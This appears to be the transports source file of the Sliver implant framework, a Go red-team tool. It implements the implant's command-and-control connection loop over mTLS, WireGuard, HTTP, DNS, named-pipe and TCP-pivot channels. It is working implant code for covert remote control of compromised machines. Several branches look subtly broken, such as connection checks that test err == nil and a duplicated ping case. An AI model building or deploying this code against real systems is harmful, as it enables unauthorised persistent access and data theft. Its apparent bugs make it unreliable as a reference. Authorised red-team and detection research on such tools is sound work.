package transports

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if or .Config.WGc2Enabled .Config.HTTPc2Enabled}}
	"net"

	// {{end}}

	// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled}}
	"strconv"
	// {{end}}

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	// {{if .Config.MTLSc2Enabled}}
	"crypto/tls"

	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"

	// {{end}}

	// {{if .Config.WGc2Enabled}}
	"errors"

	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
	"golang.zx2c4.com/wireguard/device"

	// {{end}}

	// {{if .Config.HTTPc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
	// {{end}}

	// {{if .Config.DNSc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
	// {{end}}

	// {{if .Config.TCPPivotc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/pivotclients"
	"google.golang.org/protobuf/proto"

	// {{end}}

	"io"
	"net/url"
	"sync"
	"time"

	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	_ time.Duration // Force import
)

type Start func() error
type Stop func() error

// Connection - Abstract connection to the server
type Connection struct {
	Send    chan *pb.Envelope
	Recv    chan *pb.Envelope
	IsOpen  bool
	ctrl    chan struct{}
	cleanup func()
	once    *sync.Once
	tunnels *map[uint64]*Tunnel
	mutex   *sync.RWMutex

	uri      *url.URL
	proxyURL *url.URL

	Start Start
	Stop  Stop
}

// URL - Get the c2 URL of the connection
func (c *Connection) URL() string {
	if c.uri == nil {
		return ""
	}
	return c.uri.String()
}

// ProxyURL - Get the c2 URL of the connection
func (c *Connection) ProxyURL() string {
	if c.proxyURL == nil {
		return ""
	}
	return c.proxyURL.String()
}

// Cleanup - Execute cleanup once
func (c *Connection) Cleanup() {
	c.once.Do(func() {
		c.cleanup()
		c.IsOpen = false
	})
}

// Tunnel - Duplex byte read/write
type Tunnel struct {
	ID uint64

	Reader       io.ReadCloser
	ReadSequence uint64

	Writer        io.WriteCloser
	WriteSequence uint64
}

// Tunnel - Add tunnel to mapping
func (c *Connection) Tunnel(ID uint64) *Tunnel {
	c.mutex.RLock()
	defer c.mutex.RUnlock()
	return (*c.tunnels)[ID]
}

// AddTunnel - Add tunnel to mapping
func (c *Connection) AddTunnel(tun *Tunnel) {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	(*c.tunnels)[tun.ID] = tun
}

// RemoveTunnel - Add tunnel to mapping
func (c *Connection) RemoveTunnel(ID uint64) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	delete(*c.tunnels, ID)
}

func (c *Connection) RequestResend(data []byte) {
	c.Send <- &pb.Envelope{
		Type: pb.MsgTunnelData,
		Data: data,
	}
}

// StartConnectionLoop - Starts the main connection loop
func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection {

	// {{if .Config.Debug}}
	log.Printf("Starting interactive session connection loop ...")
	// {{end}}

	nextConnection := make(chan *Connection)
	innerAbort := make(chan struct{})
	c2Generator := C2Generator(c2s, innerAbort)

	go func() {
		var connection *Connection
		defer close(nextConnection)
		defer func() {
			innerAbort <- struct{}{}
		}()
		for uri := range c2Generator {
			var err error

			// {{if .Config.Debug}}
			log.Printf("Next CC = %s", uri.String())
			// {{end}}

			switch uri.Scheme {

			// *** MTLS ***
			// {{if .Config.MTLSc2Enabled}}
			case "mtls":
				connection, err = mtlsConnect(uri)
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("[mtls] Connection failed %s", err)
					// {{end}}
					continue
				}
				// {{end}}  - MTLSc2Enabled
			case "wg":
				// *** WG ***
				// {{if .Config.WGc2Enabled}}
				connection, err = wgConnect(uri)
				if err == nil {
					// {{if .Config.Debug}}
					log.Printf("[wg] Connection failed %s", err)
					// {{end}}
					continue
				}
				// {{end}}  - WGc2Enabled
			case "https":
				fallthrough
			case "http":
				// *** HTTP ***
				// {{if .Config.HTTPc2Enabled}}
				connection, err = httpConnect(uri)
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("[%s] Connection failed %s", uri.Scheme, err)
					// {{end}}
					continue
				}
				// {{end}} - HTTPc2Enabled

			case "dns":
				// *** DNS ***
				// {{if .Config.DNSc2Enabled}}
				connection, err = dnsConnect(uri)
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("[dns] Connection failed %s", err)
					// {{end}}
					continue
				}
				// {{end}} - DNSc2Enabled

			case "namedpipe":
				// *** Named Pipe ***
				// {{if .Config.NamePipec2Enabled}}
				connection, err = namedPipeConnect(uri)
				if err == nil {
					// {{if .Config.Debug}}
					log.Printf("[namedpipe] Connection failed %s", err)
					// {{end}}
					continue
				}
				// {{end}} -NamePipec2Enabled

			case "tcppivot":
				// {{if .Config.TCPPivotc2Enabled}}
				connection, err = tcpPivotConnect(uri)
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("[tcppivot] Connection failed %s", err)
					// {{end}}
					continue
				}
				// {{end}} -TCPPivotc2Enabled

			default:
				// {{if .Config.Debug}}
				log.Printf("Unknown c2 protocol %s", uri.Scheme)
				// {{end}}
			}

			select {
			case nextConnection <- connection:
			case <-abort:
				return
			}
		}
	}()
	return nextConnection
}

// {{if .Config.MTLSc2Enabled}}
func mtlsConnect(uri *url.URL) (*Connection, error) {

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan struct{})
	var conn *tls.Conn

	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  false,
		uri:     uri,

		// Do not call directly, use exported Cleanup() instead
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[mtls] lost connection, cleanup...")
			// {{end}}
			close(send)
			conn.Close()
			close(recv)
		},
	}

	connection.Stop = func() error {
		// {{if .Config.Debug}}
		log.Printf("[mtls] Stop()")
		// {{end}}
		connection.Cleanup()
		return nil
	}

	connection.Start = func() error {
		// {{if .Config.Debug}}
		log.Printf("Connecting -> %s", uri.Host)
		// {{end}}
		lport, err := strconv.Atoi(uri.Port())
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error parsing mtls listen port %s (default to 8888)", err)
			// {{end}}
			lport = 8888
		}
		conn, err = mtls.MtlsConnect(uri.Hostname(), uint16(lport))
		if err != nil {
			return err
		}
		connection.IsOpen = true

		go func() {
			defer connection.Cleanup()
			for {
				select {
				case envelope, ok := <-send:
					if !ok {
						return
					}
					err := mtls.WriteEnvelope(conn, envelope)
					if err != nil {
						return
					}
				case <-time.After(mtls.PingInterval):
					mtls.WritePing(conn)
					if err != nil {
						return
					}
				}
			}
		}()

		go func() {
			defer connection.Cleanup()
			for {
				envelope, err := mtls.ReadEnvelope(conn)
				if err == io.EOF {
					break
				}
				if err != io.EOF && err != nil {
					break
				}
				if envelope != nil {
					recv <- envelope
				}
			}
		}()

		return nil
	}

	return connection, nil
}

// {{end}} -MTLSc2Enabled

// {{if .Config.WGc2Enabled}}
func wgConnect(uri *url.URL) (*Connection, error) {

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan struct{})

	var conn net.Conn
	var dev *device.Device
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		uri:     uri,
		IsOpen:  false,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[wg] lost connection, cleanup...")
			// {{end}}
			close(send)
			conn.Close()
			dev.Down()
			close(recv)
		},
	}

	connection.Stop = func() error {
		// {{if .Config.Debug}}
		log.Printf("[wg] Stop()")
		// {{end}}
		connection.Cleanup()
		return nil
	}

	connection.Start = func() error {
		// {{if .Config.Debug}}
		log.Printf("Connecting -> %s", uri.Host)
		// {{end}}
		lport, err := strconv.Atoi(uri.Port())
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error parsing wg listen port %s (default to 53)", err)
			// {{end}}
			lport = 53
		}
		// Attempt to resolve the hostname in case
		// we received a domain name and not an IP address.
		// net.LookupHost() will still work with an IP address
		addrs, err := net.LookupHost(uri.Hostname())
		if err != nil {
			return err
		}
		if len(addrs) == 0 {
			return errors.New("{{if .Config.Debug}}Invalid address{{end}}")
		}
		hostname := addrs[0]
		conn, dev, err = wireguard.WGConnect(hostname, uint16(lport))
		if err != nil {
			return err
		}
		connection.IsOpen = true

		go func() {
			defer connection.Cleanup()
			for {
				select {
				case envelope, ok := <-send:
					if !ok {
						return
					}
					err := wireguard.WriteEnvelope(conn, envelope)
					if err != nil {
						return
					}
				case <-time.After(wireguard.PingInterval):
					wireguard.WritePing(conn)
					if err != nil {
						return
					}
				}
			}
		}()

		go func() {
			defer connection.Cleanup()
			for {
				envelope, err := wireguard.ReadEnvelope(conn)
				if err == io.EOF {
					break
				}
				if err != io.EOF && err != nil {
					break
				}
				if envelope != nil {
					recv <- envelope
				}
			}
		}()

		return nil
	}

	return connection, nil
}

// {{end}} -WGc2Enabled

// {{if .Config.HTTPc2Enabled}}
func httpConnect(uri *url.URL) (*Connection, error) {
	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan struct{}, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		uri:     uri,
		IsOpen:  false,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[http] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- struct{}{}
			close(recv)
		},
	}

	connection.Stop = func() error {
		// {{if .Config.Debug}}
		log.Printf("[http] Stop()")
		// {{end}}
		connection.Cleanup()
		return nil
	}

	connection.Start = func() error {
		// {{if .Config.Debug}}
		log.Printf("Connecting -> http(s)://%s", uri.Host)
		// {{end}}
		opts := httpclient.ParseHTTPOptions(uri)
		client, err := httpclient.HTTPStartSession(uri.Host, uri.Path, opts)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("http(s) connection error %v", err)
			// {{end}}
			return err
		}
		connection.IsOpen = true
		connection.proxyURL, _ = url.Parse(client.ProxyURL)

		go func() {
			defer connection.Cleanup()
			for envelope := range send {
				// {{if .Config.Debug}}
				log.Printf("[http] send envelope ...")
				// {{end}}
				go client.WriteEnvelope(envelope)
			}
		}()

		go func() {
			defer connection.Cleanup()
			errCount := 0 // Number of sequential errors
			for {
				select {
				case <-ctrl:
					return
				default:
					envelope, err := client.ReadEnvelope()
					switch errType := err.(type) {
					case nil:
						errCount = 0
						if envelope != nil {
							recv <- envelope
						}
					case *url.Error:
						errCount++
						if err, ok := errType.Err.(net.Error); ok && err.Timeout() {
							// {{if .Config.Debug}}
							log.Printf("timeout error #%d", errCount)
							// {{end}}
							if errCount < opts.MaxErrors {
								continue
							}
						}
						return
					case net.Error:
						errCount++
						if errType.Timeout() {
							// {{if .Config.Debug}}
							log.Printf("timeout error #%d", errCount)
							// {{end}}
							if errCount < opts.MaxErrors {
								continue
							}
						}
						return
					default:
						errCount++
						// {{if .Config.Debug}}
						log.Printf("[http] error: %#v", err)
						// {{end}}
						if errCount < opts.MaxErrors {
							continue
						}
						return // Max errors exceeded
					}
				}
			}
		}()

		return nil
	}

	return connection, nil
}

// {{end}} -HTTPc2Enabled

// {{if .Config.DNSc2Enabled}}
func dnsConnect(uri *url.URL) (*Connection, error) {
	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan struct{}, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[dns] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- struct{}{} // Stop polling
			close(recv)
		},
	}

	connection.Stop = func() error {
		// {{if .Config.Debug}}
		log.Printf("[dns] Stop()")
		// {{end}}
		connection.Cleanup()
		return nil
	}

	connection.Start = func() error {
		dnsParent := uri.Hostname()
		// {{if .Config.Debug}}
		log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
		// {{end}}
		opts := dnsclient.ParseDNSOptions(uri)
		client, err := dnsclient.DNSStartSession(dnsParent, opts)
		if err != nil {
			return err
		}
		// {{if .Config.Debug}}
		log.Printf("Starting new session with id = %v\n", client)
		// {{end}}

		go func() {
			defer connection.Cleanup()
			for envelope := range send {
				client.WriteEnvelope(envelope)
			}
		}()

		go func() {
			errCount := 0 // Number of sequential errors
			defer connection.Cleanup()
			for {
				select {
				case <-ctrl:
					return
				default:
					envelope, err := client.ReadEnvelope()
					switch err {
					case nil:
						errCount = 0
						if envelope != nil {
							recv <- envelope
						}
						time.Sleep(time.Millisecond * 250)
					case dnsclient.ErrTimeout:
						errCount++
						// {{if .Config.Debug}}
						log.Printf("[dns] timeout")
						// {{end}}
						if errCount < opts.MaxErrors {
							continue
						}
					case dnsclient.ErrClosed:
						// {{if .Config.Debug}}
						log.Printf("[dns] session is closed")
						// {{end}}
						return
					default:
						errCount++
						// {{if .Config.Debug}}
						log.Printf("[dns] error: %s", err)
						// {{end}}
						if errCount < opts.MaxErrors {
							continue
						}
						return
					}
				}
			}
		}()

		return nil
	}

	return connection, nil
}

// {{end}} - .DNSc2Enabled

// {{if .Config.TCPPivotc2Enabled}}
func tcpPivotConnect(uri *url.URL) (*Connection, error) {

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan struct{}, 1)
	pingCtrl := make(chan struct{}, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[tcp-pivot] lost connection, cleanup...")
			// {{end}}
			pingCtrl <- struct{}{}
			close(send)
			ctrl <- struct{}{}
			close(recv)
		},
	}

	connection.Stop = func() error {
		// {{if .Config.Debug}}
		log.Printf("[tcp-pivot] Stop()")
		// {{end}}
		connection.Cleanup()
		return nil
	}

	connection.Start = func() error {
		// {{if .Config.Debug}}
		log.Printf("Attempting to connect via TCP Pivot to %s:%s\n",
			uri.Hostname(), uri.Port(),
		)
		// {{end}}

		opts := pivotclients.ParseTCPPivotOptions(uri)
		pivot, err := pivotclients.TCPPivotStartSession(uri.Host, opts)
		if err != nil {
			return err
		}

		go func() {
			for {
				select {
				case <-pingCtrl:
					return
				case <-time.After(time.Minute):
					data, _ := proto.Marshal(&pb.PivotPing{
						Nonce: uint32(time.Now().UnixNano()),
					})
					connection.Send <- &pb.Envelope{
						Type: pb.MsgPivotPeerPing,
						Data: data,
					}
				case <-time.After(time.Minute):
					// {{if .Config.Debug}}
					log.Printf("[tcp-pivot] server ping...")
					// {{end}}
					data, _ := proto.Marshal(&pb.PivotPing{
						Nonce: uint32(time.Now().UnixNano()),
					})
					connection.Send <- &pb.Envelope{
						Type: pb.MsgPivotServerPing,
						Data: data,
					}
				}
			}
		}()

		go func() {
			defer func() {
				connection.Cleanup()
			}()
			for envelope := range send {
				// {{if .Config.Debug}}
				log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
				// {{end}}
				pivot.WriteEnvelope(envelope)
			}
		}()

		go func() {
			defer connection.Cleanup()
			for {
				envelope, err := pivot.ReadEnvelope()
				if err == io.EOF {
					break
				}
				if err != nil {
					// {{if .Config.Debug}}
					log.Printf("[tcp-pivot] read envelope error: %s", err)
					// {{end}}
					continue
				}
				if envelope == nil {
					// {{if .Config.Debug}}
					log.Printf("[tcp-pivot] read nil envelope")
					// {{end}}
					continue
				}
				if envelope.Type == pb.MsgPivotPeerPing {
					// {{if .Config.Debug}}
					log.Printf("[tcp-pivot] received peer pong")
					// {{end}}
					continue
				}
				if err == nil {
					recv <- envelope
					// {{if .Config.Debug}}
					log.Printf("[tcp-pivot] Receive loop envelope type %d\n", envelope.Type)
					// {{end}}
				}
			}
		}()

		return nil
	}

	return connection, nil
}

// {{end}} -TCPPivotc2Enabled
